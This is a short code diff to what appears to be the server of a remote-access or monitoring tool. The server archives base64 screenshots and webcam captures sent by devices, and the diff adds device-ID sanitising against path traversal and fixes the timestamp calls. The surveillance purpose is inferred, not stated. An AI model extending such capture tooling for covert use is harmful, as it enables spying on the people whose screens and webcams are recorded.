@@ -26,13 +26,15 @@ let RESULTS_DIR = path.join(BASE_DIR, "storage", "results")
 
 # Helpers for storage
 fn getSsDir(deviceId)
-    let d = path.join(BASE_DIR, "storage", "screenshots", deviceId)
+    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
+    let d = path.join(BASE_DIR, "storage", "screenshots", safeId)
     try dir.createAll(d) catch e end
     return d
 end
 
 fn getWcDir(deviceId)
-    let d = path.join(BASE_DIR, "storage", "webcam", deviceId)
+    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
+    let d = path.join(BASE_DIR, "storage", "webcam", safeId)
     try dir.createAll(d) catch e end
     return d
 end
@@ -43,19 +45,20 @@ fn autoArchive(deviceId, rawData)
     end
 
     let now = datetime.now()
-    let ts = str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "_" + str(now.hour) + "-" + str(now.minute) + "-" + str(now.second)
+    let ts = str(now.year()) + "-" + str(now.month()) + "-" + str(now.day()) + "_" + str(now.hour()) + "-" + str(now.minute()) + "-" + str(now.second())
+    let safeId = deviceId.replace(":", "_").replace("/", "_").replace("\\", "_")
 
     if rawData.startsWith("SCREENSHOT:")
         let b64 = rawData.substring(11).strip()
         if b64 != "" and !b64.startsWith("ERR:")
-            let sDir = getSsDir(deviceId)
+            let sDir = getSsDir(safeId)
             let filePath = path.join(sDir, ts + ".b64")
             try file.write(filePath, b64) catch e end
         end
     elif rawData.startsWith("WEBCAM:")
         let b64 = rawData.substring(7).strip()
         if b64 != "" and b64 != "NO_WEBCAM" and !b64.startsWith("ERR:")
-            let wDir = getWcDir(deviceId)
+            let wDir = getWcDir(safeId)
             let filePath = path.join(wDir, ts + ".b64")
             try file.write(filePath, b64) catch e end
         end
